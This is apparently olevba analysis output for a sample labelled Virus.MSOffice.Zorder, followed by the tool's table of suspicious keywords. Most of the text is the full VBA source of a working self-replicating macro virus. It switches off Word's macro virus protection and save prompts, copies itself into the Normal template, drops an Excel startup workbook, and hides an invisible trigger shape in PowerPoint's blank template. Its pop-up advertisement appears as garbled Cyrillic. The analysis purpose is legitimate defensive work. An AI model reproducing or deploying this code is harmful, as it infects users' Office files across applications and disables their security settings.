olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Zorder
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Ďđĺäëîćĺíčĺ.vba 
in file: Virus.MSOffice.Zorder - OLE stream: 'VBA/Ďđĺäëîćĺíčĺ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--Ďđîăŕ-->
'Ďđĺäëîćĺíčĺ v0.01 /Ďđîăŕ
Private Sub Document_Close() ' Word
    On Error Resume Next
MsgBox "ÎÎÎ ""Ęóđńęěĺňŕëë""" & Chr(13) & "Çŕęóďŕĺň ëîě ÷¸đíűő ěĺňŕëëîâ." & Chr(13) & "Öĺíű ďđčĺěëĺěűĺ." & Chr(13) & "Íŕř ŕäđĺń: ďđ. Ęóëŕęîâŕ 109-ŕ, ňĺë./ôŕęń (0712) 32-00-42": Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set TT = Templates(1).VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If AD.Lines(1, 1) <> "'<!--Ďđîăŕ-->" Then
        AD.deletelines 1, AD.CountOfLines
        AD.InsertLines 1, TT.Lines(1, TT.CountOfLines)
        If AD.Lines(1, 1) <> "'<!--Ďđîăŕ-->" Then
            AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
        End If
    End If
    If NT.Lines(1, 1) <> "'<!--Ďđîăŕ-->" Then
        NT.deletelines 1, NT.CountOfLines
        NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
        Set xlApp = CreateObject("Excel.Application")
        If UCase(Dir(xlApp.Application.StartupPath + "\Âňîđńűđüĺ.")) <> UCase("ÂŇÎĐŃŰĐÜĹ") Then
            'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Check"
            'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
            'System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Whoa"
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Âňîđńűđüĺ."
            Book1Obj.Close
        End If
        xlApp.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Ďđĺäëîćĺíčĺ" Then dontadd = True
        Next
        If dontadd <> True Then
            'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options", "MacroVirusProtection") = ""
            'System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Ďđĺäëîćĺíčĺ"
            NewMod.CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Ďđĺäëîćĺíčĺ"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
    End If
    If TT.Lines(1, 1) <> "'<!--Ďđîăŕ-->" Then
        TT.deletelines 1, TT.CountOfLines
        TT.InsertLines 1, NT.Lines(1, NT.CountOfLines)
    End If
End Sub
Private Sub Workbook_Deactivate() 'Excel
MsgBox "ÎÎÎ ""Ęóđńęěĺňŕëë""" & Chr(13) & "Çŕęóďŕĺň ëîě ÷¸đíűő ěĺňŕëëîâ." & Chr(13) & "Öĺíű ďđčĺěëĺěűĺ." & Chr(13) & "Íŕř ŕäđĺń: ďđ. Ęóëŕęîâŕ 109-ŕ, ňĺë./ôŕęń (0712) 32-00-42":    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If UCase(Dir(Application.StartupPath + "\Âňîđńűđüĺ.")) <> "ÂŇÎĐŃŰĐÜĹ" Then
        Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then
            Set WordObj = CreateObject("Word.Application")
            WQuit = True
        End If
        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        WordObj.Options.SaveNormalPrompt = False
        NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + TW.Lines(23, 3) + Chr(13) + Chr(10) + TW.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
        WordObj.Run "Normal.ThisDocument.DisableAV"
        NT.deletelines 1, NT.CountOfLines
        NT.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        Set NT = Nothing
        If WQuit = True Then WordObj.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Ďđĺäëîćĺíčĺ" Then dontadd = True
        Next
        If dontadd <> True Then
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Ďđĺäëîćĺíčĺ"
            NewMod.CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Ďđĺäëîćĺíčĺ"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        Book1Obj.SaveAs FileName:=Application.StartupPath & "\Âňîđńűđüĺ.", FileFormat:=xlNormal, AddToMru:=False
        Book1Obj.Close
        xlApp.Quit
    End If
    If AW.Lines(1, 1) <> "'<!--Ďđîăŕ-->" Then
        AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
    End If
End Sub
Sub actionhook(tristate)
    On Error Resume Next
    If Int(Rnd * 7) = 0 Then
        MsgBox "ÎÎÎ ""Ęóđńęěĺňŕëë""" & Chr(13) & "Çŕęóďŕĺň ëîě ÷¸đíűő ěĺňŕëëîâ." & Chr(13) & "Öĺíű ďđčĺěëĺěűĺ." & Chr(13) & "Íŕř ŕäđĺń: ďđ. Ęóëŕęîâŕ 109-ŕ, ňĺë./ôŕęń (0712) 32-00-42": Set Home = ActivePresentation
        If UCase(Dir(Application.Path + "\Xlstart\Âňîđńűđüĺ.")) <> UCase("ÂŇÎĐŃŰĐÜĹ") Then
            Set WordObj = GetObject(, "Word.Application")
            If WordObj = "" Then
                Set WordObj = CreateObject("Word.Application")
                WQuit = True
            End If
            Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
            WordObj.Options.SaveNormalPrompt = False
            NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Ďđĺäëîćĺíčĺ").CodeModule.Lines(23, 3) + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Ďđĺäëîćĺíčĺ").CodeModule.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
            WordObj.Run "Normal.ThisDocument.DisableAV"
            NT.deletelines 1, NT.CountOfLines
            NT.InsertLines 1, Home.VBProject.VBComponents("Ďđĺäëîćĺíčĺ").CodeModule.Lines(1, Home.VBProject.VBComponents("Ďđĺäëîćĺíčĺ").CodeModule.CountOfLines)
            NT.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Set NT = Nothing
            If WQuit = True Then WordObj.Quit
            Set xlApp = CreateObject("Excel.Application")
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, Home.VBProject.VBComponents("Ďđĺäëîćĺíčĺ").CodeModule.Lines(1, Home.VBProject.VBComponents("Ďđĺäëîćĺíčĺ").CodeModule.CountOfLines)
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Âňîđńűđüĺ."
            Book1Obj.Close
            xlApp.Quit
            Set PBT = Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
            dontadd = False
            For Each ModComponent In PBT.VBProject.VBComponents
                If ModComponent.Name = "Ďđĺäëîćĺíčĺ" Then dontadd = True
            Next
            If dontadd <> True Then
                Set NewMod = PBT.VBProject.VBComponents.Add(1)
                NewMod.Name = "Ďđĺäëîćĺíčĺ"
                NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("Ďđĺäëîćĺíčĺ").CodeModule.Lines(1, Home.VBProject.VBComponents("Ďđĺäëîćĺíčĺ").CodeModule.CountOfLines)
                Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
                With ShapetoWack
                    .Name = "Ďđĺäëîćĺíčĺ"
                    .ZOrder (1)
                    .Line.Visible = False
                    .Fill.Visible = False
                    .ActionSettings(1).Action = 8
                    .ActionSettings(1).Run = "actionhook"
                End With
                PBT.Save
            End If
            PBT.Close
        End If
    End If
    ActivePresentation.SlideShowWindow.View.Next
End Sub








Option Explicit

Option Explicit

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

